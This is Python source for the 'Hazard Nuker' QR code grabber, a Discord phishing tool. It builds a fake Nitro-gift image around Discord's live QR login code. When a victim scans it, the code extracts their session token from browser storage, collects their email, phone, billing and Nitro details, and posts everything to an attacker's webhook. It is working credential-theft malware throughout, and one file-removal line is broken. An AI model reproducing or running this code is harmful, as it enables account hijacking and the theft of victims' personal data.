# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

#Cred/inspiration goes to https://github.com/NightfallGT/Discord-QR-Scam


import base64
import json
import os
import sys
from time import sleep
from urllib.request import urlretrieve
from zipfile import ZipFile

import requests
from bs4 import BeautifulSoup
from colorama import Fore
from PIL import Image
from selenium import common, webdriver

import Hazard
from util.plugins.common import SlowPrint, getDriver, getheaders


def logo_qr():
    im1 = Image.open('QR-Code/qr_code.png', 'r')
    im2 = Image.open('QR-Code/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('QR-Code/final_qr.png', quality=100)

def paste_template():
    im1 = Image.open('QR-Code/template.png', 'r')
    im2 = Image.open('QR-Code/final_qr.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=100)

def QR_Grabber(Webhook):
    type_ = getDriver()

    if type_ == "chromedriver.exe":
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option('detach', True)
        opts.add_argument('--incognito')
        try:
            driver = webdriver.Chrome(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Enter anything to continue. . . ")
            input()
            Hazard.main()
    elif type_ == "operadriver.exe":
        opts = webdriver.opera.options.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        opts.add_argument('--incognito')
        try:
            driver = webdriver.Opera(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Enter anything to continue. . . ")
            input()
            Hazard.main()
    elif type_ == "msedgedriver.exe":
        opts = webdriver.EdgeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        opts.add_argument('--incognito')
        try:
            driver = webdriver.Edge(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint(f"Enter anything to continue. . .")
            input()
            Hazard.main()
    else:
        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a driver to create a QR code with')
        sleep(3)
        print("Enter anything to continue. . . ", end="")
        input()
        Hazard.main()

    print(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Awaiting Page to Load!')
    driver.get('https://discord.com/login')
    sleep(5)
    print(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Page loaded.')

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='lxml')

    #Create the QR code
    div = soup.find('div', {'class': 'qrLoginInner-1phtZ_'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'QR-Code/qr_code.png')
    
    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    print(f"\n{Fore.WHITE}Downloading templates for QR code")

    # Download qr code templates
    urlretrieve("https://github.com/Swxy7w7/Hazard-Archive/blob/main/qr_code/QR-Code.zip?raw=true", filename="QR-Code.zip")

    with ZipFile("QR-Code.zip", 'r')as zip2:
        zip2.extractall()
    os.remove("QR-Code.zip")

    with open(file, 'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    #remove the templates
    os.remove(os.getcwd()+"\\QR-Code\\overlay.png")
    os.remove(os.getcwd()+"\\QR-Code\\template.png")
    os.remove(os.getcwd()+"\\QR-Code\\qr_code.png")
    os.remove(os.getcwd(+"\\QR-Code\\final_qr.png"))

    print(f'\nQR Code generated in '+os.getcwd()+"\\QR-Code")
    print(f'\n{Fore.RED}Make sure to have this window open to grab their token!{Fore.RESET}')
    print(f'{Fore.MAGENTA}Send the QR Code to a user and wait for them to scan!{Fore.RESET}')
    os.system(f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
    if sys.argv[0].endswith(".exe"):
        print(f'\nOpening a new HazardNuker so you can keep using it while this one logs the qr code!\nFeel free to minimize this window{Fore.RESET}')
        try:
            os.startfile(sys.argv[0])
        except Exception:
            pass

    #Waiting for them to scan QR code
    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
            window.dispatchEvent(new Event('beforeunload'));
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            let localStorage = iframe.contentWindow.localStorage;
            var token = JSON.parse(localStorage.token);
            return token;
            ''')
            j = requests.get("https://discord.com/api/v10/users/@me", headers=getheaders(token)).json()
            badges = ""
            flags = j['flags']
            if (flags == 1): badges += "Staff, "
            if (flags == 2): badges += "Partner, "
            if (flags == 4): badges += "Hypesquad Event, "
            if (flags == 8): badges += "Green Bughunter, "
            if (flags == 64): badges += "Hypesquad Bravery, "
            if (flags == 128): badges += "HypeSquad Brillance, "
            if (flags == 256): badges += "HypeSquad Balance, "
            if (flags == 512): badges += "Early Supporter, "
            if (flags == 16384): badges += "Gold BugHunter, "
            if (flags == 131072): badges += "Verified Bot Developer, "
            if (badges == ""): badges = "None"

            user = j["username"] + "#" + str(j["discriminator"])
            email = j["email"]
            phone = j["phone"] if j["phone"] else "No Phone Number attached"

            url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
            try:
                requests.get(url)
            except:
                url = url[:-4]
            nitro_data = requests.get('https://discordapp.com/api/v10/users/@me/billing/subscriptions', headers=getheaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v10/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)

            embed = {
                "avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
                "embeds": [
                    {
                        "author": {
                            "name": "Hazard QR Code Grabber",
                            "url": "https://github.com/Rdimo/Hazard-Nuker",
                            "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
                        },
                        "description": f"**{user}** Just Scanned the QR code\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
                        "fields": [
                            {
                              "name": "**Token**",
                              "value": f"```yml\n{token}```",
                              "inline": False
                            }
                        ],
                        "color": 8388736,

                        "footer": {
                          "text": "©Rdimo#6969 https://github.com/Rdimo/Hazard-Nuker"
                        }
                    }
                ]
            }
            requests.post(Webhook, json=embed)
            break
    os._exit(0)
